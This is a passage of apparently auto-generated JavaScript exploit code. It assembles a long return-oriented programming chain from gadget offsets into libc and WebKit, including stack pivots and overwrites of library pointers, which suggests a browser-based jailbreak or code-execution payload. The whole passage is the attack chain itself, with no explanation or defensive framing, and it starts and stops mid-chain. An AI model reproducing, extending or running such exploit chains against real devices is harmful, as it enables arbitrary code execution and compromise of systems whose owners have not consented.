]);
//L1938:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1939:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1940:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+140008, //L1941
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+140024, //L1942
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L1941:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1942:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+140136, //L1943
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+140120, //L1944
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L1944:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L1943:
db([0, 0]); // 0x0
//L1910:
set_gadgets([
libc_base+793877, //pop rsi
ropchain+140224, //L1946
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+140208, //L1945
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1945:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1946:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+140320, //L1947
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+140336, //L1948
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L1947:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1948:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+140448, //L1949
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+140432, //L1950
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L1950:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L1949:
db([0, 0]); // 0x0
//L1934:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
__swbuf_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+141776, //L1951
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L1951:
db([0, 0]); // 0x0
//___bswap64_var:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+141848, //L1953
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L1953:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+141936, //L1954
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+141952, //L1956
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1954:
db([0, 0]); // 0x0
set_gadget(webkit_base+432898,); //pop r8
//L1956:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1957:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+142072, //L1960
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+142056, //L1958
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1958:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1960:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+142176, //L1961
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+142208, //L1963
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+142192, //L1962
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1961:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1962:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1963:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+142304, //L1964
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+142320, //L1965
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L1964:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1965:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+142432, //L1966
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+142416, //L1967
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L1967:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L1966:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+142520, //L1969
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+142504, //L1968
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1968:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1969:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+142616, //L1970
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+142632, //L1971
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L1970:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1971:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+142744, //L1972
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+142728, //L1973
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L1973:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L1972:
db([0, 0]); // 0x0
//___bswap32_var:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+142816, //L1975
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L1975:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+142904, //L1976
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+142920, //L1978
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1976:
db([0, 0]); // 0x0
set_gadget(webkit_base+432898,); //pop r8
//L1978:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1979:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+143040, //L1982
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+143024, //L1980
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1980:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1982:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+143208, //L1985
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+143224, //L1986
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+143192, //L1983
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+143176, //L1984
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1984:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1983:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1985:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1986:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+143384, //L1990
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+143336, //L1988
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+143368, //L1989
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1988:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1987:
db([32, 0]); // 0x20
set_gadget(libc_base+206806,); //pop rdi
//L1989:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1990:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+143496, //L1991
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+143528, //L1993
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+143512, //L1992
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1991:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1992:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1993:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+143624, //L1994
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+143640, //L1995
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L1994:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1995:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+143752, //L1996
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+143736, //L1997
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L1997:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L1996:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+143840, //L1999
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+143824, //L1998
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1998:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1999:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+143936, //L2000
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+143952, //L2001
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2000:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2001:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+144064, //L2002
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+144048, //L2003
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2003:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2002:
db([0, 0]); // 0x0
//___bswap16_var:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+144136, //L2005
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2005:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+144224, //L2006
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+144240, //L2008
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2006:
db([0, 0]); // 0x0
set_gadget(webkit_base+432898,); //pop r8
//L2008:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2009:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+144360, //L2012
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+144344, //L2010
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2010:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2012:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270800, //mov ax, [rdi]
libc_base+793877, //pop rsi
ropchain+144520, //L2016
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+144472, //L2014
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+144504, //L2015
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2014:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2013:
db([16, 0]); // 0x10
set_gadget(libc_base+206806,); //pop rdi
//L2015:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2016:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+144576, //L2018
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2018:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+144680, //L2020
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+144712, //L2021
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+144696, //L2019
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2020:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2019:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2021:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+144872, //L2025
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+144824, //L2023
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+144856, //L2024
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2023:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2022:
db([48, 0]); // 0x30
set_gadget(libc_base+206806,); //pop rdi
//L2024:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2025:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+144976, //L2027
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+144960, //L2026
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2026:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2027:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2028:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L2029:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+145184, //L2032
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+145152, //L2031
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2031:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2030:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2032:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+145288, //L2034
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+145272, //L2033
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2033:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2034:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+145368, //L2035
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2035:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2037:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+145488, //L2040
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+145472, //L2038
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2038:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2040:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270800, //mov ax, [rdi]
libc_base+793877, //pop rsi
ropchain+145648, //L2044
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+145600, //L2042
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+145632, //L2043
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2042:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2041:
db([16, 0]); // 0x10
set_gadget(libc_base+206806,); //pop rdi
//L2043:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2044:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+145704, //L2046
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2046:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+145808, //L2048
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+145840, //L2049
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+145824, //L2047
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2048:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2047:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2049:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+146000, //L2053
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+145952, //L2051
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
